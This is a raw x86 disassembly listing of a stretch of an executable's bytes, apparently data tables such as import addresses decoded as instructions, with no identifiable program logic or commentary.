  4120ad:	sub    eax,DWORD PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [eax],ah
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [ebx+ebp*1],dh
  4120ba:	add    DWORD PTR [eax],eax
  4120bc:	inc    esi
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [edx+0x2b],dl
  4120c2:	add    DWORD PTR [eax],eax
  4120c4:	sub    eax,DWORD PTR fs:[ecx]
  4120c7:	add    BYTE PTR [esi+0x2b],dh
  4120ca:	add    DWORD PTR [eax],eax
  4120cc:	nop
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [esi-0x47fffed5],ah
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    ah,al
  4120d9:	sub    eax,DWORD PTR [ecx]
  4120db:	add    dl,dl
  4120dd:	sub    eax,DWORD PTR [ecx]
  4120df:	add    al,ah
  4120e1:	sub    eax,DWORD PTR [ecx]
  4120e3:	add    dl,ch
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dl,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [edx],cl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [esi],dl
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],dh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [esp+ebp*1],bh
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	inc    esi
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [esi+0x2c],dl
  412102:	add    DWORD PTR [eax],eax
  412104:	bound  ebp,QWORD PTR [ecx+eax*1]
  412107:	add    BYTE PTR [eax+0x2c],bh
  41210a:	add    DWORD PTR [eax],eax
  41210c:	test   BYTE PTR [ecx+eax*1],ch
  41210f:	add    BYTE PTR [eax-0x57fffed4],bl
  412115:	sub    al,0x1
  412117:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41211e:	add    DWORD PTR [eax],eax
  412120:	(bad)  
  412121:	sub    al,0x1
  412123:	add    al,ch
  412125:	sub    al,0x1
  412127:	add    dh,bh
  412129:	sub    al,0x1
  41212b:	add    BYTE PTR [esi],cl
  41212d:	sub    eax,0x2d1e0001
  412132:	add    DWORD PTR [eax],eax
  412134:	sub    ch,BYTE PTR ds:0x2d3a0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	dec    esp
  41213d:	sub    eax,0x2d5e0001
  412142:	add    DWORD PTR [eax],eax
  412144:	je     0x412173
  412146:	add    DWORD PTR [eax],eax
  412148:	sub    BYTE PTR ds:0x2d900001,0x1
  41214f:	add    BYTE PTR [esi-0x4bfffed3],bl
  412155:	sub    eax,0x2dc00001
  41215a:	add    DWORD PTR [eax],eax
  41215c:	shr    BYTE PTR ds:0x2de40001,cl
  412162:	add    DWORD PTR [eax],eax
  412164:	imul   BYTE PTR ds:0x2e020001
  41216a:	add    DWORD PTR [eax],eax
  41216c:	adc    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	and    BYTE PTR [esi],ch
  412172:	add    DWORD PTR [eax],eax
  412174:	sub    al,0x2e
  412176:	add    DWORD PTR [eax],eax
  412178:	ds add DWORD PTR cs:[eax],eax
  41217c:	dec    esp
  41217d:	add    DWORD PTR cs:[eax],eax
  412180:	pop    edx
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	jo     0x4121b4
  412186:	add    DWORD PTR [eax],eax
  412188:	jle    0x4121b8
  41218a:	add    DWORD PTR [eax],eax
  41218c:	mov    ch,BYTE PTR [esi]
  41218e:	add    DWORD PTR [eax],eax
  412190:	call   0x12e:0xae00012e
  412197:	add    ah,al
  412199:	add    DWORD PTR cs:[eax],eax
  41219c:	aam    0x2e
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	fisubr WORD PTR [esi]
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	in     al,dx
  4121a5:	add    DWORD PTR cs:[eax],eax
  4121a8:	(bad)  
  4121a9:	add    DWORD PTR cs:[eax],eax
  4121ac:	or     al,0x2f
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	and    al,0x2f
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	ss das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	dec    eax
  4121b9:	das    
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	push   esi
  4121bd:	das    
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	fs das 
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	js     0x4121f5
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    ch,BYTE PTR [edi]
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	pushf  
  4121cd:	das    
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	test   al,0x2f
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	mov    esp,0xc800012f
  4121d9:	das    
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	fisubr WORD PTR [edi]
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	repnz das 
  4121e2:	add    DWORD PTR [eax],eax
  4121e4:	(bad)  
  4121e5:	das    
  4121e6:	add    DWORD PTR [eax],eax
  4121e8:	or     BYTE PTR [eax],dh
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   ss
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi],ah
  4121f1:	xor    BYTE PTR [ecx],al
  4121f3:	add    BYTE PTR [esi],bh
  4121f5:	xor    BYTE PTR [ecx],al
  4121f7:	add    BYTE PTR [eax+0x30],dl
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	bound  esi,QWORD PTR [eax]
  4121fe:	add    DWORD PTR [eax],eax
  412200:	outs   dx,BYTE PTR ds:[esi]
  412201:	xor    BYTE PTR [ecx],al
  412203:	add    BYTE PTR [eax-0x71fffed0],al
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  412212:	add    DWORD PTR [eax],eax
  412214:	mov    esi,0xcc000130
  412219:	xor    BYTE PTR [ecx],al
  41221b:	add    al,bl
  41221d:	xor    BYTE PTR [ecx],al
  41221f:	add    dh,ah
  412221:	xor    BYTE PTR [ecx],al
  412223:	add    al,bh
  412225:	xor    BYTE PTR [ecx],al
  412227:	add    BYTE PTR [esi],al
  412229:	xor    DWORD PTR [ecx],eax
  41222b:	add    BYTE PTR [edx],dl
  41222d:	xor    DWORD PTR [ecx],eax
  41222f:	add    BYTE PTR [ecx+esi*1],ah
  412232:	add    DWORD PTR [eax],eax
  412234:	cmp    BYTE PTR [ecx],dh
  412236:	add    DWORD PTR [eax],eax
  412238:	dec    edx
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [edx+0x31],bl
  41223e:	add    DWORD PTR [eax],eax
  412240:	push   0x31
  412242:	add    DWORD PTR [eax],eax
  412244:	js     0x412277
  412246:	add    DWORD PTR [eax],eax
  412248:	xchg   esi,eax
  412249:	xor    DWORD PTR [ecx],eax
  41224b:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  412252:	add    DWORD PTR [eax],eax
  412254:	shl    BYTE PTR [ecx],cl
  412256:	add    DWORD PTR [eax],eax
  412258:	in     al,0x31
  41225a:	add    DWORD PTR [eax],eax
  41225c:	cld    
  41225d:	xor    DWORD PTR [ecx],eax
  41225f:	add    BYTE PTR [edx],cl
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax],al
  412265:	add    BYTE PTR [eax],al
  412267:	add    BYTE PTR [edx+esi*1],ch
  41226a:	add    DWORD PTR [eax],eax
  41226c:	inc    esp
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [esi+0x32],dl
  412272:	add    DWORD PTR [eax],eax
  412274:	outs   dx,BYTE PTR ds:[esi]
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    BYTE PTR [eax-0x63fffece],al
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    BYTE PTR [eax],al
  412281:	add    BYTE PTR [eax],al
  412283:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  41228a:	add    DWORD PTR [eax],eax
  41228c:	out    0x32,al
  41228e:	add    DWORD PTR [eax],eax
  412290:	cli    
  412291:	xor    al,BYTE PTR [ecx]
  412293:	add    BYTE PTR [edx],cl
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [eax],ah
  412299:	xor    eax,DWORD PTR [ecx]
  41229b:	add    BYTE PTR [esi],dh
  41229d:	xor    eax,DWORD PTR [ecx]
  41229f:	add    BYTE PTR [ebx+esi*1+0x1],al
  4122a3:	add    BYTE PTR [eax+0x33],dl
  4122a6:	add    DWORD PTR [eax],eax
  4122a8:	pop    esp
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi+0x33],ah
  4122ae:	add    DWORD PTR [eax],eax
  4122b0:	je     0x4122e5
  4122b2:	add    DWORD PTR [eax],eax
  4122b4:	xor    BYTE PTR [ebx],0x1
  4122b7:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4122be:	add    DWORD PTR [eax],eax
  4122c0:	ret    0x133
  4122c3:	add    dh,dl
  4122c5:	xor    eax,DWORD PTR [ecx]
  4122c7:	add    dh,ch
  4122c9:	xor    eax,DWORD PTR [ecx]
  4122cb:	add    ah,bh
  4122cd:	xor    eax,DWORD PTR [ecx]
  4122cf:	add    BYTE PTR [esi],dl
  4122d1:	xor    al,0x1
  4122d3:	add    BYTE PTR [edx],ch
  4122d5:	xor    al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1],dh
  4122da:	add    DWORD PTR [eax],eax
  4122dc:	inc    esp
  4122dd:	xor    al,0x1
  4122df:	add    BYTE PTR [esi+0x34],cl
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	pop    edx
  4122e5:	xor    al,0x1
  4122e7:	add    BYTE PTR [esi+0x34],ch
  4122ea:	add    DWORD PTR [eax],eax
  4122ec:	xchg   BYTE PTR [ecx+eax*1],dh
  4122ef:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  4122f6:	add    DWORD PTR [eax],eax
  4122f8:	mov    dl,0x34
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	enter  0x134,0x0
  412300:	fidiv  DWORD PTR [ecx+eax*1]
  412303:	add    dh,ah
  412305:	xor    al,0x1
  412307:	add    dl,bh
  412309:	xor    al,0x1
  41230b:	add    BYTE PTR [esi*1+0x350e0001],al
  412312:	add    DWORD PTR [eax],eax
  412314:	push   ds
  412315:	xor    eax,0x35360001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	dec    edx
  41231d:	xor    eax,0x355a0001
  412322:	add    DWORD PTR [eax],eax
  412324:	xor    ax,0x1
  412328:	je     0x41235f
  41232a:	add    DWORD PTR [eax],eax
  41232c:	mov    dh,BYTE PTR ds:0x359c0001
  412332:	add    DWORD PTR [eax],eax
  412334:	add    BYTE PTR [eax],al
  412336:	add    BYTE PTR [eax],al
  412338:	mov    edx,0xce000135
  41233d:	xor    eax,0x35e00001
  412342:	add    DWORD PTR [eax],eax
  412344:	in     al,dx
  412345:	xor    eax,0x36040001
  41234a:	add    DWORD PTR [eax],eax
  41234c:	adc    al,0x36
  41234e:	add    DWORD PTR [eax],eax
  412350:	sub    BYTE PTR [esi],dh
  412352:	add    DWORD PTR [eax],eax
  412354:	ds add DWORD PTR ss:[eax],eax
  412358:	dec    esi
  412359:	add    DWORD PTR ss:[eax],eax
  41235c:	pusha  
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	ins    BYTE PTR es:[edi],dx
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	xor    BYTE PTR [esi],0x1
  412367:	add    BYTE PTR [esi-0x49fffeca],bl
  41236d:	add    DWORD PTR ss:[eax],eax
  412370:	retf   0x136
  412373:	add    dl,bl
  412375:	add    DWORD PTR ss:[eax],eax
  412378:	out    0x36,al
  41237a:	add    DWORD PTR [eax],eax
  41237c:	(bad)  
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	adc    BYTE PTR [edi],dh
  412382:	add    DWORD PTR [eax],eax
  412384:	and    dh,BYTE PTR [edi]
  412386:	add    DWORD PTR [eax],eax
  412388:	xor    dh,BYTE PTR [edi]
  41238a:	add    DWORD PTR [eax],eax
  41238c:	inc    esp
  41238d:	aaa    
  41238e:	add    DWORD PTR [eax],eax
  412390:	push   eax
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	pusha  
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	outs   dx,BYTE PTR ds:[esi]
  412399:	aaa    
  41239a:	add    DWORD PTR [eax],eax
  41239c:	js     0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	mov    BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	xchg   esi,eax
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	test   al,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	mov    esi,0xd2000137
  4123b1:	aaa    
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	jmp    0x138:0x137
  4123bb:	add    BYTE PTR [esi],cl
  4123bd:	cmp    BYTE PTR [ecx],al
  4123bf:	add    BYTE PTR [esi],ah
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],bh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	dec    esp
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+0x38],bl
  4123ce:	add    DWORD PTR [eax],eax
  4123d0:	jo     0x41240a
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	jle    0x41240e
  4123d6:	add    DWORD PTR [eax],eax
  4123d8:	xchg   edx,eax
  4123d9:	cmp    BYTE PTR [ecx],al
  4123db:	add    BYTE PTR [esi-0x51fffec8],bl
  4123e1:	cmp    BYTE PTR [ecx],al
  4123e3:	add    dh,al
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    dl,bl
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    al,ch
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    dh,bh
  4123f1:	cmp    BYTE PTR [ecx],al
  4123f3:	add    BYTE PTR [edx],dl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [esi],bl
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [eax],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax],al
  412401:	add    BYTE PTR [eax],al
  412403:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412407:	add    BYTE PTR [edx+0x39],dh
  41240a:	add    DWORD PTR [eax],eax
	...
  412414:	popf   
  412415:	dec    esp
  412416:	(bad)  
  412417:	dec    ebp
  412418:	add    BYTE PTR [eax],al
  41241a:	add    BYTE PTR [eax],al
  41241c:	add    al,BYTE PTR [eax]
  41241e:	add    BYTE PTR [eax],al
  412420:	inc    edx
  412421:	add    BYTE PTR [eax],al
  412423:	add    BYTE PTR [edx+edi*1+0x3],dl
  412427:	add    BYTE PTR [edx+ebp*1+0x3],dl
	...
  412433:	add    BYTE PTR [ebp+0x4dc74c],bl
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [edx+0x24],ah
  41243e:	add    DWORD PTR [eax],eax
  412440:	add    DWORD PTR [eax],eax
  412442:	add    BYTE PTR [eax],al
  412444:	add    DWORD PTR [eax],eax
  412446:	add    BYTE PTR [eax],al
  412448:	add    DWORD PTR [eax],eax
  41244a:	add    BYTE PTR [eax],al
  41244c:	pop    eax
  41244d:	and    al,0x1
  41244f:	add    BYTE PTR [esp+0x1],bl
  412453:	add    BYTE PTR [eax+0x24],ah
  412456:	add    DWORD PTR [eax],eax
  412458:	lock xor al,BYTE PTR [eax]
  41245b:	add    BYTE PTR [ebx+0x24],dh
  41245e:	add    DWORD PTR [eax],eax
  412460:	add    BYTE PTR [eax],al
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	push   esi
  412464:	popa   
  412465:	addr16 inc edi
  412467:	push   edi
  412468:	js     0x4124be
  41246a:	outs   dx,DWORD PTR ds:[esi]
  41246b:	ss addr16 xor al,0x2e
  41246f:	je     0x4124e0
  412471:	jo     0x412473
  412473:	aas    
  412474:	inc    edi
  412475:	outs   dx,BYTE PTR gs:[esi]
  412477:	gs jb  0x4124db
  41247a:	je     0x4124e1
  41247c:	push   esp
  41247d:	gs js  0x4124f4
  412480:	push   edi
  412481:	inc    eax
  412482:	inc    eax
  412483:	pop    ecx
  412484:	inc    edi
  412485:	push   eax
  412486:	inc    ecx
  412487:	dec    edx
  412488:	pop    edi
  412489:	dec    esi
  41248a:	cmp    al,0x56
  41248c:	add    BYTE PTR [eax],al
  41248e:	add    BYTE PTR [eax],al
  412490:	sbb    al,0x25
  412492:	add    DWORD PTR [eax],eax
	...
  41249c:	adc    al,0x2b
  41249e:	add    DWORD PTR [eax],eax
  4124a0:	add    BYTE PTR [eax],ah
  4124a2:	add    DWORD PTR [eax],eax
  4124a4:	shl    BYTE PTR ds:0x1,1
  4124aa:	add    BYTE PTR [eax],al
  4124ac:	add    BYTE PTR [eax],al
  4124ae:	add    BYTE PTR [eax],al
  4124b0:	and    BYTE PTR [edx],dh
  4124b2:	add    DWORD PTR [eax],eax
  4124b4:	mov    ah,0x20
  4124b6:	add    DWORD PTR [eax],eax
  4124b8:	test   BYTE PTR [edi],ah
  4124ba:	add    DWORD PTR [eax],eax
	...
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	xor    al,BYTE PTR [ecx]
  4124c7:	add    BYTE PTR [eax+0x22],ch
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	mov    al,ds:0x127
  4124d1:	add    BYTE PTR [eax],al
  4124d3:	add    BYTE PTR [eax],al
  4124d5:	add    BYTE PTR [eax],al
  4124d7:	add    BYTE PTR [eax-0x7bfffecb],dh
  4124dd:	and    al,BYTE PTR [ecx]
  4124df:	add    BYTE PTR [eax+ebp*1+0x1],dl
	...
  4124eb:	add    BYTE PTR [esi+0x39],cl
  4124ee:	add    DWORD PTR [eax],eax
  4124f0:	cmp    BYTE PTR [ebx],ah
  4124f2:	add    DWORD PTR [eax],eax
  4124f4:	and    BYTE PTR [ecx],ch
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	mov    BYTE PTR [ecx],bh
  412502:	add    DWORD PTR [eax],eax
  412504:	add    al,0x24
  412506:	add    DWORD PTR [eax],eax
	...
  41251c:	sub    al,0x29
  41251e:	add    DWORD PTR [eax],eax
  412520:	sub    DWORD PTR ss:[ecx],eax
  412523:	add    BYTE PTR [eax+0x29],al
  412526:	add    DWORD PTR [eax],eax
  412528:	dec    esi
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [eax+0x29],bl
  41252e:	add    DWORD PTR [eax],eax
  412530:	bound  ebp,QWORD PTR [ecx]
  412532:	add    DWORD PTR [eax],eax
  412534:	ins    BYTE PTR es:[edi],dx
  412535:	sub    DWORD PTR [ecx],eax
  412537:	add    BYTE PTR [esi+0x29],dh
  41253a:	add    DWORD PTR [eax],eax
  41253c:	mov    BYTE PTR [ecx],ch
  41253e:	add    DWORD PTR [eax],eax
  412540:	xchg   edx,eax
  412541:	sub    DWORD PTR [ecx],eax
  412543:	add    BYTE PTR [edx-0x5dfffed7],bl
  412549:	sub    DWORD PTR [ecx],eax
  41254b:	add    BYTE PTR [esi-0x43fffed7],ch
  412551:	sub    DWORD PTR [ecx],eax
  412553:	add    dh,al
  412555:	sub    DWORD PTR [ecx],eax
  412557:	add    dl,dl
  412559:	sub    DWORD PTR [ecx],eax
  41255b:	add    ah,bl
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    ah,ch
  412561:	sub    DWORD PTR [ecx],eax
  412563:	add    ah,dh
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    ah,bh
  412569:	sub    DWORD PTR [ecx],eax
  41256b:	add    BYTE PTR [esi],al
  41256d:	sub    al,BYTE PTR [ecx]
  41256f:	add    BYTE PTR [edx],dl
  412571:	sub    al,BYTE PTR [ecx]
  412573:	add    BYTE PTR [esi],bl
  412575:	sub    al,BYTE PTR [ecx]
  412577:	add    BYTE PTR [edx+ebp*1],ch
  41257a:	add    DWORD PTR [eax],eax
  41257c:	sub    al,BYTE PTR ss:[ecx]
  41257f:	add    BYTE PTR [edx+0x2a],al
  412582:	add    DWORD PTR [eax],eax
  412584:	dec    esp
  412585:	sub    al,BYTE PTR [ecx]
  412587:	add    BYTE PTR [esi+0x2a],dl
  41258a:	add    DWORD PTR [eax],eax
  41258c:	sub    al,BYTE PTR fs:[ecx]
  41258f:	add    BYTE PTR [eax+0x2a],dh
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	xchg   BYTE PTR [edx],ch
  41259a:	add    DWORD PTR [eax],eax
  41259c:	nop
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [eax-0x5dfffed6],bl
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	shr    BYTE PTR [edx],0x1
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    al,ch
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    al,dh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	sub    eax,DWORD PTR [ecx]
  4125c7:	add    BYTE PTR [edx],cl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [eax],al
  4125cd:	add    BYTE PTR [eax],al
  4125cf:	add    BYTE PTR [eax],ah
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1],dh
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	inc    esi
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [edx+0x2b],dl
  4125de:	add    DWORD PTR [eax],eax
  4125e0:	sub    eax,DWORD PTR fs:[ecx]
  4125e3:	add    BYTE PTR [esi+0x2b],dh
  4125e6:	add    DWORD PTR [eax],eax
  4125e8:	nop
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [esi-0x47fffed5],ah
  4125f1:	sub    eax,DWORD PTR [ecx]
  4125f3:	add    ah,al
  4125f5:	sub    eax,DWORD PTR [ecx]
  4125f7:	add    dl,dl
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    al,ah
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    dl,ch
  412601:	sub    eax,DWORD PTR [ecx]
  412603:	add    dl,bh
  412605:	sub    eax,DWORD PTR [ecx]
  412607:	add    BYTE PTR [edx],cl
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [esi],dl
  41260d:	sub    al,0x1
  41260f:	add    BYTE PTR [eax],dh
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [esp+ebp*1],bh
  412616:	add    DWORD PTR [eax],eax
  412618:	inc    esi
  412619:	sub    al,0x1
  41261b:	add    BYTE PTR [esi+0x2c],dl
  41261e:	add    DWORD PTR [eax],eax
  412620:	bound  ebp,QWORD PTR [ecx+eax*1]
  412623:	add    BYTE PTR [eax+0x2c],bh
  412626:	add    DWORD PTR [eax],eax
  412628:	test   BYTE PTR [ecx+eax*1],ch
  41262b:	add    BYTE PTR [eax-0x57fffed4],bl
  412631:	sub    al,0x1
  412633:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41263a:	add    DWORD PTR [eax],eax
  41263c:	(bad)  
  41263d:	sub    al,0x1
  41263f:	add    al,ch
  412641:	sub    al,0x1
  412643:	add    dh,bh
  412645:	sub    al,0x1
  412647:	add    BYTE PTR [esi],cl
  412649:	sub    eax,0x2d1e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	sub    ch,BYTE PTR ds:0x2d3a0001
  412656:	add    DWORD PTR [eax],eax
  412658:	dec    esp
  412659:	sub    eax,0x2d5e0001
  41265e:	add    DWORD PTR [eax],eax
  412660:	je     0x41268f
  412662:	add    DWORD PTR [eax],eax
  412664:	sub    BYTE PTR ds:0x2d900001,0x1
  41266b:	add    BYTE PTR [esi-0x4bfffed3],bl
  412671:	sub    eax,0x2dc00001
  412676:	add    DWORD PTR [eax],eax
  412678:	shr    BYTE PTR ds:0x2de40001,cl
  41267e:	add    DWORD PTR [eax],eax
  412680:	imul   BYTE PTR ds:0x2e020001
  412686:	add    DWORD PTR [eax],eax
  412688:	adc    BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	and    BYTE PTR [esi],ch
  41268e:	add    DWORD PTR [eax],eax
  412690:	sub    al,0x2e
  412692:	add    DWORD PTR [eax],eax
  412694:	ds add DWORD PTR cs:[eax],eax
  412698:	dec    esp
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	pop    edx
  41269d:	add    DWORD PTR cs:[eax],eax
  4126a0:	jo     0x4126d0
  4126a2:	add    DWORD PTR [eax],eax
  4126a4:	jle    0x4126d4
  4126a6:	add    DWORD PTR [eax],eax
  4126a8:	mov    ch,BYTE PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0x12e:0xae00012e
  4126b3:	add    ah,al
  4126b5:	add    DWORD PTR cs:[eax],eax
  4126b8:	aam    0x2e
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	fisubr WORD PTR [esi]
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	in     al,dx
  4126c1:	add    DWORD PTR cs:[eax],eax
  4126c4:	(bad)  
  4126c5:	add    DWORD PTR cs:[eax],eax
  4126c8:	or     al,0x2f
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	and    al,0x2f
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	ss das 
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	dec    eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	push   esi
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	fs das 
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	js     0x412711
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	mov    ch,BYTE PTR [edi]
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	pushf  
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	test   al,0x2f
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	mov    esp,0xc800012f
  4126f5:	das    
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	fisubr WORD PTR [edi]
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	repnz das 
  4126fe:	add    DWORD PTR [eax],eax
  412700:	(bad)  
  412701:	das    
  412702:	add    DWORD PTR [eax],eax
  412704:	or     BYTE PTR [eax],dh
  412706:	add    DWORD PTR [eax],eax
  412708:	push   ss
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [esi],ah
  41270d:	xor    BYTE PTR [ecx],al
  41270f:	add    BYTE PTR [esi],bh
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax+0x30],dl
  412716:	add    DWORD PTR [eax],eax
  412718:	bound  esi,QWORD PTR [eax]
  41271a:	add    DWORD PTR [eax],eax
  41271c:	outs   dx,BYTE PTR ds:[esi]
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    BYTE PTR [eax-0x71fffed0],al
  412725:	xor    BYTE PTR [ecx],al
  412727:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	mov    esi,0xcc000130
  412735:	xor    BYTE PTR [ecx],al
  412737:	add    al,bl
  412739:	xor    BYTE PTR [ecx],al
  41273b:	add    dh,ah
  41273d:	xor    BYTE PTR [ecx],al
  41273f:	add    al,bh
  412741:	xor    BYTE PTR [ecx],al
  412743:	add    BYTE PTR [esi],al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    BYTE PTR [edx],dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    BYTE PTR [ecx+esi*1],ah
  41274e:	add    DWORD PTR [eax],eax
  412750:	cmp    BYTE PTR [ecx],dh
  412752:	add    DWORD PTR [eax],eax
  412754:	dec    edx
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [edx+0x31],bl
  41275a:	add    DWORD PTR [eax],eax
  41275c:	push   0x31
  41275e:	add    DWORD PTR [eax],eax
  412760:	js     0x412793
  412762:	add    DWORD PTR [eax],eax
  412764:	xchg   esi,eax
  412765:	xor    DWORD PTR [ecx],eax
  412767:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	shl    BYTE PTR [ecx],cl
  412772:	add    DWORD PTR [eax],eax
  412774:	in     al,0x31
  412776:	add    DWORD PTR [eax],eax
  412778:	cld    
  412779:	xor    DWORD PTR [ecx],eax
  41277b:	add    BYTE PTR [edx],cl
  41277d:	xor    al,BYTE PTR [ecx]
